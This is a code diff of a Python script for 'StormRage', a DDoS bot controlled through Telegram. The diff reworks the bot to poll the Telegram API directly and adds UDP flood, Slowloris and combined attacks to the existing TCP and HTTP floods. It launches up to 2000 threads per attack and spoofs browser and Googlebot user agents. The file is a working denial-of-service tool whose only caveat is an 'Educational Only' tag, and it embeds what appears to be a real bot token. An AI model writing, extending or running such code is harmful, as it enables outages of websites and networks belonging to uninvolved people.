@@ -3,197 +3,329 @@ import threading
 import requests
 import random
 import time
-import os
-import asyncio
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+import json
+from datetime import datetime
 
 # ==================== CONFIGURATION ====================
-# CHANGE THESE TWO LINES
-BOT_TOKEN = "8957381735:AAEbDCbmmzvT1aDUBdUOjDAHZdbi5OQpxxQ"  # ← Put your bot token
-ADMIN_IDS = [7898928200]  # ← Put your Telegram user ID
+BOT_TOKEN = "8957381735:AAEbDCbmmzvT1aDUBdUOjDAHZdbi5OQpxxQ"
+ADMIN_IDS = [7898928200]
 
 # Active attacks storage
 active_attacks = {}
+attack_stats = {}
+last_update_id = 0
 
-# ==================== ORIGINAL DDOS FUNCTIONS ====================
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+# ==================== TELEGRAM API ====================
+def tg_request(method, params=None):
+    """Make request to Telegram API"""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+    try:
+        if params:
+            r = requests.post(url, json=params, timeout=10)
+        else:
+            r = requests.get(url, timeout=10)
+        return r.json()
+    except Exception as e:
+        print(f"API Error: {e}")
+        return {"ok": False}
 
-def tcp_flood(ip, port, chat_id):
-    while active_attacks.get(chat_id, False):
+def send_message(chat_id, text):
+    """Send message to Telegram"""
+    return tg_request("sendMessage", {"chat_id": chat_id, "text": text})
+
+def get_updates(offset=None):
+    """Get new updates"""
+    params = {"timeout": 30, "allowed_updates": ["message"]}
+    if offset:
+        params["offset"] = offset
+    return tg_request("getUpdates", params)
+
+# ==================== DDOS ATTACK METHODS ====================
+
+def tcp_attack(ip, port, chat_id, stop_event):
+    """TCP Flood Attack"""
+    while not stop_event.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
             sock.connect((ip, port))
-            data = random._urandom(1024)
-            sock.send(data)
+            sock.send(random._urandom(65535))
             sock.close()
-            print(f"\033[92m[TCP] Packet sent to {ip}:{port}")
+            with threading.Lock():
+                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 1
         except:
-            print(f"\033[91m[TCP] Failed to send packet to {ip}:{port}")
+            pass
 
-def https_flood(url, chat_id):
-    while active_attacks.get(chat_id, False):
+def udp_attack(ip, port, chat_id, stop_event):
+    """UDP Flood Attack"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while not stop_event.is_set():
         try:
-            headers = {
-                'User-Agent': random.choice([
-                    'Mozilla/5.0',
-                    'Chrome/91.0',
-                    'Safari/537.36',
-                    'Opera/9.80'
-                ])
-            }
-            response = requests.get(url, headers=headers, timeout=3)
-            print(f"\033[92m[HTTPS] Request sent to {url} | Status: {response.status_code}")
+            sock.sendto(random._urandom(65535), (ip, port))
+            with threading.Lock():
+                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 1
         except:
-            print(f"\033[91m[HTTPS] Failed to send request to {url}")
+            pass
 
-# ==================== TELEGRAM COMMANDS ====================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized. You are not admin.")
-        return
-    
-    await update.message.reply_text(
-        "🔥 *StormRage DDoS Bot Activated* 🔥\n\n"
-        "Commands:\n"
-        "/attack_tcp <IP> <PORT> <THREADS> - Start TCP attack\n"
-        "/attack_http <URL> <THREADS> - Start HTTP attack\n"
-        "/stop - Stop current attack\n"
-        "/status - Check attack status\n"
-        "/help - Show this menu\n\n"
-        "⚠️ For educational/testing purposes only!",
-        parse_mode='Markdown'
-    )
+def http_attack(url, chat_id, stop_event):
+    """HTTP Flood Attack"""
+    user_agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Mobile/15E148',
+        'Mozilla/5.0 (Linux; Android 13) Chrome/119.0.0.0',
+        'Googlebot/2.1 (+http://www.google.com/bot.html)'
+    ]
+    while not stop_event.is_set():
+        try:
+            headers = {'User-Agent': random.choice(user_agents)}
+            requests.get(url, headers=headers, timeout=3, verify=False)
+            with threading.Lock():
+                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 1
+        except:
+            pass
 
-async def attack_tcp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized.")
-        return
-    
-    try:
-        ip = context.args[0]
-        port = int(context.args[1])
-        threads = int(context.args[2])
-    except:
-        await update.message.reply_text("⚠️ Usage: /attack_tcp <IP> <PORT> <THREADS>\nExample: /attack_tcp 192.168.1.1 80 500")
-        return
-    
-    chat_id = update.effective_chat.id
-    
-    # Stop any existing attack
-    if chat_id in active_attacks:
-        active_attacks[chat_id] = False
-        time.sleep(1)
-    
-    active_attacks[chat_id] = True
-    
-    await update.message.reply_text(
-        f"🔥 *TCP Attack Started!*\n"
-        f"Target: {ip}:{port}\n"
-        f"Threads: {threads}\n"
-        f"Status: Sending packets...",
-        parse_mode='Markdown'
-    )
-    
-    for _ in range(threads):
-        thread = threading.Thread(target=tcp_flood, args=(ip, port, chat_id))
-        thread.daemon = True
-        thread.start()
-    
-    # Background stats
-    while active_attacks.get(chat_id, False):
-        await asyncio.sleep(10)
+def slowloris_attack(ip, port, chat_id, stop_event):
+    """Slowloris Attack"""
+    while not stop_event.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((ip, port))
+            sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
+            while not stop_event.is_set():
+                sock.send(f"X-Keep: {random.randint(1,9999)}\r\n".encode())
+                time.sleep(5)
+            sock.close()
+        except:
+            pass
 
-async def attack_http(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized.")
-        return
-    
-    try:
-        url = context.args[0]
-        threads = int(context.args[1])
-    except:
-        await update.message.reply_text("⚠️ Usage: /attack_http <URL> <THREADS>\nExample: /attack_http https://example.com 500")
-        return
-    
-    chat_id = update.effective_chat.id
-    
-    # Stop any existing attack
-    if chat_id in active_attacks:
-        active_attacks[chat_id] = False
-        time.sleep(1)
-    
-    active_attacks[chat_id] = True
-    
-    await update.message.reply_text(
-        f"🔥 *HTTP Attack Started!*\n"
-        f"Target: {url}\n"
-        f"Threads: {threads}\n"
-        f"Status: Sending requests...",
-        parse_mode='Markdown'
-    )
-    
-    for _ in range(threads):
-        thread = threading.Thread(target=https_flood, args=(url, chat_id))
-        thread.daemon = True
-        thread.start()
-    
-    while active_attacks.get(chat_id, False):
-        await asyncio.sleep(10)
+# ==================== COMMAND HANDLERS ====================
 
-async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized.")
-        return
-    
-    chat_id = update.effective_chat.id
+def start_attack(chat_id, attack_type, target, port, threads):
+    """Start attack with given parameters"""
     if chat_id in active_attacks and active_attacks[chat_id]:
-        active_attacks[chat_id] = False
-        await update.message.reply_text("🛑 Attack stopped successfully!")
-    else:
-        await update.message.reply_text("⚠️ No active attack to stop.")
-
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized.")
-        return
+        active_attacks[chat_id].set()
     
-    chat_id = update.effective_chat.id
+    stop_event = threading.Event()
+    active_attacks[chat_id] = stop_event
+    attack_stats[chat_id] = 0
+    
+    for _ in range(min(threads, 2000)):
+        if attack_type == "tcp":
+            t = threading.Thread(target=tcp_attack, args=(target, port, chat_id, stop_event))
+        elif attack_type == "udp":
+            t = threading.Thread(target=udp_attack, args=(target, port, chat_id, stop_event))
+        elif attack_type == "http":
+            t = threading.Thread(target=http_attack, args=(target, chat_id, stop_event))
+        elif attack_type == "slow":
+            t = threading.Thread(target=slowloris_attack, args=(target, port, chat_id, stop_event))
+        elif attack_type == "all":
+            # Mixed attack
+            t1 = threading.Thread(target=tcp_attack, args=(target, port, chat_id, stop_event))
+            t2 = threading.Thread(target=udp_attack, args=(target, port, chat_id, stop_event))
+            t3 = threading.Thread(target=http_attack, args=(f"http://{target}", chat_id, stop_event))
+            t1.daemon = True
+            t2.daemon = True
+            t3.daemon = True
+            t1.start()
+            t2.start()
+            t3.start()
+            continue
+        t.daemon = True
+        t.start()
+    
+    return True
+
+def stop_attack(chat_id):
+    """Stop current attack"""
     if chat_id in active_attacks and active_attacks[chat_id]:
-        await update.message.reply_text("💀 Attack is currently RUNNING")
+        active_attacks[chat_id].set()
+        active_attacks[chat_id] = None
+        return True
+    return False
+
+# ==================== BOT COMMANDS ====================
+
+def cmd_start(chat_id, user_id):
+    if user_id not in ADMIN_IDS:
+        send_message(chat_id, "❌ Unauthorized")
+        return
+    msg = """🔥 *StormRage DDoS Bot* 🔥
+
+*Commands:*
+/tcp <IP> <PORT> <THREADS> - TCP Flood
+/udp <IP> <PORT> <THREADS> - UDP Flood
+/http <URL> <THREADS> - HTTP Flood
+/slow <IP> <PORT> <THREADS> - Slowloris
+/all <IP> <PORT> <THREADS> - All Attacks
+/stop - Stop Attack
+/stats - Attack Stats
+/help - This Menu
+
+*Example:*
+/tcp 185.31.40.28 80 500
+
+⚠️ Educational Only"""
+    send_message(chat_id, msg)
+
+def cmd_tcp(chat_id, user_id, args):
+    if user_id not in ADMIN_IDS:
+        send_message(chat_id, "❌ Unauthorized")
+        return
+    if len(args) < 3:
+        send_message(chat_id, "Usage: /tcp <IP> <PORT> <THREADS>")
+        return
+    try:
+        ip = args[0]
+        port = int(args[1])
+        threads = int(args[2])
+        start_attack(chat_id, "tcp", ip, port, threads)
+        send_message(chat_id, f"✅ TCP Attack Started\nTarget: {ip}:{port}\nThreads: {threads}")
+    except Exception as e:
+        send_message(chat_id, f"Error: {str(e)}")
+
+def cmd_udp(chat_id, user_id, args):
+    if user_id not in ADMIN_IDS:
+        send_message(chat_id, "❌ Unauthorized")
+        return
+    if len(args) < 3:
+        send_message(chat_id, "Usage: /udp <IP> <PORT> <THREADS>")
+        return
+    try:
+        ip = args[0]
+        port = int(args[1])
+        threads = int(args[2])
+        start_attack(chat_id, "udp", ip, port, threads)
+        send_message(chat_id, f"✅ UDP Attack Started\nTarget: {ip}:{port}\nThreads: {threads}")
+    except Exception as e:
+        send_message(chat_id, f"Error: {str(e)}")
+
+def cmd_http(chat_id, user_id, args):
+    if user_id not in ADMIN_IDS:
+        send_message(chat_id, "❌ Unauthorized")
+        return
+    if len(args) < 2:
+        send_message(chat_id, "Usage: /http <URL> <THREADS>")
+        return
+    try:
+        url = args[0]
+        threads = int(args[1])
+        start_attack(chat_id, "http", url, 0, threads)
+        send_message(chat_id, f"✅ HTTP Attack Started\nTarget: {url}\nThreads: {threads}")
+    except Exception as e:
+        send_message(chat_id, f"Error: {str(e)}")
+
+def cmd_slow(chat_id, user_id, args):
+    if user_id not in ADMIN_IDS:
+        send_message(chat_id, "❌ Unauthorized")
+        return
+    if len(args) < 3:
+        send_message(chat_id, "Usage: /slow <IP> <PORT> <THREADS>")
+        return
+    try:
+        ip = args[0]
+        port = int(args[1])
+        threads = int(args[2])
+        start_attack(chat_id, "slow", ip, port, threads)
+        send_message(chat_id, f"✅ Slowloris Started\nTarget: {ip}:{port}\nThreads: {threads}")
+    except Exception as e:
+        send_message(chat_id, f"Error: {str(e)}")
+
+def cmd_all(chat_id, user_id, args):
+    if user_id not in ADMIN_IDS:
+        send_message(chat_id, "❌ Unauthorized")
+        return
+    if len(args) < 3:
+        send_message(chat_id, "Usage: /all <IP> <PORT> <THREADS>")
+        return
+    try:
+        ip = args[0]
+        port = int(args[1])
+        threads = int(args[2])
+        start_attack(chat_id, "all", ip, port, threads)
+        send_message(chat_id, f"✅ ALL Attacks Started\nTarget: {ip}:{port}\nThreads: {threads}")
+    except Exception as e:
+        send_message(chat_id, f"Error: {str(e)}")
+
+def cmd_stop(chat_id, user_id):
+    if user_id not in ADMIN_IDS:
+        send_message(chat_id, "❌ Unauthorized")
+        return
+    if stop_attack(chat_id):
+        send_message(chat_id, "🛑 Attack Stopped")
     else:
-        await update.message.reply_text("✅ No active attack")
+        send_message(chat_id, "No active attack")
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await start(update, context)
+def cmd_stats(chat_id, user_id):
+    if user_id not in ADMIN_IDS:
+        send_message(chat_id, "❌ Unauthorized")
+        return
+    packets = attack_stats.get(chat_id, 0)
+    status = "🔴 RUNNING" if active_attacks.get(chat_id) and not active_attacks[chat_id].is_set() else "🟢 IDLE"
+    send_message(chat_id, f"📊 *Statistics*\nPackets: {packets:,}\nStatus: {status}")
 
-# ==================== MAIN FIXED ====================
+def cmd_help(chat_id, user_id):
+    cmd_start(chat_id, user_id)
+
+# ==================== MAIN LOOP ====================
 def main():
-    print("🤖 Starting StormRage Bot...")
-    print("⚠️ Make sure BOT_TOKEN and ADMIN_IDS are set correctly")
+    global last_update_id
+    print("🤖 StormRage Bot Started!")
+    print(f"Bot Token: {BOT_TOKEN[:15]}...")
+    print("Waiting for commands...\n")
     
-    # Create bot application
-    app = Application.builder().token(BOT_TOKEN).build()
+    for admin in ADMIN_IDS:
+        send_message(admin, "✅ StormRage Bot is ONLINE!")
     
-    # Add command handlers
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("attack_tcp", attack_tcp))
-    app.add_handler(CommandHandler("attack_http", attack_http))
-    app.add_handler(CommandHandler("stop", stop_attack))
-    app.add_handler(CommandHandler("status", status))
-    app.add_handler(CommandHandler("help", help_command))
-    
-    print("✅ Bot handlers registered")
-    print("🚀 Bot is running...")
-    
-    # Start the bot (removed the problematic username line)
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    while True:
+        try:
+            response = get_updates(last_update_id + 1 if last_update_id else None)
+            
+            if response.get("ok") and response.get("result"):
+                for update in response["result"]:
+                    last_update_id = update["update_id"]
+                    
+                    if "message" in update:
+                        msg = update["message"]
+                        chat_id = msg["chat"]["id"]
+                        user_id = msg["from"]["id"]
+                        text = msg.get("text", "").strip()
+                        
+                        if not text.startswith("/"):
+                            continue
+                        
+                        parts = text.split()
+                        command = parts[0].lower()
+                        args = parts[1:]
+                        
+                        print(f"[{datetime.now().strftime('%H:%M:%S')}] {command} from {user_id}")
+                        
+                        if command == "/start":
+                            cmd_start(chat_id, user_id)
+                        elif command == "/tcp":
+                            cmd_tcp(chat_id, user_id, args)
+                        elif command == "/udp":
+                            cmd_udp(chat_id, user_id, args)
+                        elif command == "/http":
+                            cmd_http(chat_id, user_id, args)
+                        elif command == "/slow":
+                            cmd_slow(chat_id, user_id, args)
+                        elif command == "/all":
+                            cmd_all(chat_id, user_id, args)
+                        elif command == "/stop":
+                            cmd_stop(chat_id, user_id)
+                        elif command == "/stats":
+                            cmd_stats(chat_id, user_id)
+                        elif command == "/help":
+                            cmd_help(chat_id, user_id)
+                        else:
+                            send_message(chat_id, "Unknown command. Use /help")
+            
+            time.sleep(1)
+            
+        except Exception as e:
+            print(f"Error: {e}")
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
